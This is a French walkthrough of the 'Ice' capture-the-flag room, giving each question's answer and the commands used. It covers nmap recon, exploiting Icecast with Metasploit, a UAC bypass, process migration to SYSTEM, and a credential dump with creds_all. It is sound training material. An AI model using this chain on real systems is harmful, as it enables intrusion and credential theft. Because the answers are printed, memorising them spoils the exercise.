## ICE

````
Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?
````

Commande; nmap -sS -sV [IP]

**Réponse; 3389**

````
What service did nmap identify as running on port 8000? (First word of this service)
````

commande; nmap -sV [IP] -p 8000

**Réponse; icecast**

````
What does Nmap identify as the hostname of the machine? (All caps for the answer)
````
commande; nmap -sC [IP]

*3389/tcp  open  ms-wbt-server  
| ssl-cert: Subject: commonName=Dark-PC     
| Not valid before: 2024-03-22T14:51:01     
|_Not valid after:  2024-09-21T14:51:01     
|_ssl-date: 2024-03-23T15:04:24+00:00; 0s from scanner time.*

**Réponse; Dark-PC**

````
 What is the Impact Score for this vulnerability? Use https://www.cvedetails.com for this question and the next.
````
**Réponse;6.4**
````
What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
````
**Réponse; CVE-2004-1561**

Ce qui est étrange c'est l'ordre des questions, plus logique de demandé le CVE qui est concerné puis l'impact score. SI vous n'aviez pas trouvé => la suite parle de metasploit donc vous auriez eu les détails

````
What is the full path (starting with exploit) for the exploitation module?
````
**Réponse; exploit/windows/http/icecast_header**

````
What is the only required setting which currently is blank?
````
**Réponse; RHOSTS**

````
Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
````
**Réponse; meterpreter**

````
What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'Metasploit' module.
````

commande; getuid

**Réponse; Dark**

Si vous faites cette room en préparation de l'eJPT => allez voir le cours sur Metasploit

````
What build of Windows is the system?
````

commande; sysinfo

**Réponse; 7601**

````
First, what is the architecture of the process we're running?
````
commande; sysinfo

**Réponse; x64**


Il faut d'abord entrer "run post/multi/recon/local_exploit_suggester" avant de continuer pour la prochaine question. 

````
What is the full path (starting with exploit/) for the first returned exploit?
````

**Réponse; exploit/windows/local/bypassuac_eventvwr**


````
We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
````

commande; getprivs

**Réponse; SeTakeOwnershipPrivilege**


````
The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?
````
**Réponse; spoolsv.exe**

Commande ; migrate -N spoolsv.exe   
note => dans le cours de l'eJPT il ne me semble pas qu'il montre l'option -N pour migrer d'un process à un autre. 

````
Let's check what user we are now with the command `getuid`. What user is listed?
````
**Réponse; NT AUTHORITY\SYSTEM**

````
Which command allows up to retrieve all credentials?
````

**Réponse; creds_all**
````
What is Dark's password?
````

commande; creds_all 

*tspkg credentials   
Username  Domain   Password     
Dark      Dark-PC  Password01!*

**Réponse; Password01!**

Le reste des réponses est dans le menu d'aide de meterpreter
